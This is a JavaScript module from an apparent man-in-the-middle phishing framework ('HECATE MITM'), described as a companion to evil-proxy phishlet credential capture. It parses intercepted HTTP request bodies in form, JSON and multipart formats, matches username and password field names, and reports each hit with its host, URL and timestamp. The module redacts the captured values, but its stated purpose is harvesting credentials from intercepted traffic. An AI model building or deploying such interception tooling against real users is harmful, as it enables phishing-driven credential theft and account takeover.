'use strict';

/**
 * HECATE MITM — Credential Sniffer
 * Scans intercepted HTTP request bodies for credentials.
 * Companion to the evil-proxy credential capture — this operates on
 * raw HTTP traffic rather than phishlet-defined patterns.
 *
 * Pure functions — no side effects.
 */

// Field names likely to contain usernames
const USERNAME_FIELDS = new Set([
  'username', 'user', 'login', 'email', 'mail', 'uname', 'uid',
  'account', 'handle', 'identifier', 'principal',
]);

// Field names likely to contain passwords
const PASSWORD_FIELDS = new Set([
  'password', 'passwd', 'pass', 'pwd', 'secret', 'credential',
  'pin', 'passcode', 'passphrase', 'token',
]);

// Pattern-based detection for form-urlencoded
const CRED_PATTERN = /(?:^|&)((?:user(?:name)?|login|email|mail|pass(?:word|wd|code)?|pwd|secret|credential|token|pin))=([^&]+)/gi;

/**
 * Inspect an intercepted HTTP request for credentials.
 * @param {object} req
 * @param {string} req.method
 * @param {string} req.url
 * @param {string} req.host
 * @param {object} req.headers
 * @param {string} req.body
 * @returns {SniffResult|null}  null if nothing found
 */
function sniff(req) {
  // Only POST/PUT bodies are interesting
  if (!['POST', 'PUT', 'PATCH'].includes(req.method?.toUpperCase())) return null;
  if (!req.body) return null;

  const ct = (req.headers?.['content-type'] ?? '').toLowerCase();

  let found = null;

  if (ct.includes('application/x-www-form-urlencoded')) {
    found = _sniffUrlEncoded(req.body);
  } else if (ct.includes('application/json')) {
    found = _sniffJson(req.body);
  } else if (ct.includes('multipart/form-data')) {
    found = _sniffMultipart(req.body);
  }

  if (!found || !found.length) return null;

  return {
    host:     req.host    ?? new URL(req.url ?? 'http://x').hostname,
    url:      req.url     ?? '',
    method:   req.method,
    findings: found,
    ts:       new Date().toISOString(),
  };
}

function _sniffUrlEncoded(body) {
  const findings = [];
  const seen     = new Set();

  // Pattern scan
  const re = new RegExp(CRED_PATTERN.source, CRED_PATTERN.flags);
  let m;
  while ((m = re.exec(body)) !== null) {
    const field = m[1].toLowerCase();
    const val   = decodeURIComponent(m[2].replace(/\+/g, ' '));
    if (seen.has(field)) continue;
    seen.add(field);

    const type = PASSWORD_FIELDS.has(field) ? 'password'
               : USERNAME_FIELDS.has(field) ? 'username'
               : 'credential';

    findings.push({ field, type, redacted: _redact(val, type) });
  }

  return findings;
}

function _sniffJson(body) {
  const findings = [];
  let obj;
  try { obj = JSON.parse(body); } catch { return findings; }
  if (typeof obj !== 'object' || !obj) return findings;

  _walkObject(obj, '', findings);
  return findings;
}

function _walkObject(obj, prefix, findings, depth = 0) {
  if (depth > 3) return; // don't go too deep
  for (const [k, v] of Object.entries(obj)) {
    const key = k.toLowerCase();
    if (typeof v === 'object' && v !== null) {
      _walkObject(v, prefix ? `${prefix}.${k}` : k, findings, depth + 1);
      continue;
    }
    if (typeof v !== 'string' || !v) continue;
    const type = PASSWORD_FIELDS.has(key) ? 'password'
               : USERNAME_FIELDS.has(key) ? 'username'
               : null;
    if (type) findings.push({ field: k, type, redacted: _redact(v, type) });
  }
}

function _sniffMultipart(body) {
  const findings = [];
  const fieldRe  = /Content-Disposition:\s*form-data;\s*name="([^"]+)"(?!.*filename=)[\r\n]+([^\r\n-][^-]*?)(?=--)/gis;
  let m;
  while ((m = fieldRe.exec(body)) !== null) {
    const field = m[1].toLowerCase();
    const val   = m[2].trim();
    const type  = PASSWORD_FIELDS.has(field) ? 'password'
                : USERNAME_FIELDS.has(field) ? 'username'
                : null;
    if (type) findings.push({ field: m[1], type, redacted: _redact(val, type) });
  }
  return findings;
}

function _redact(val, type) {
  if (type === 'password') return `[${val.length} chars]`;
  if (val.length <= 4)     return val;
  return val.slice(0, 3) + '…';
}

module.exports = { sniff };
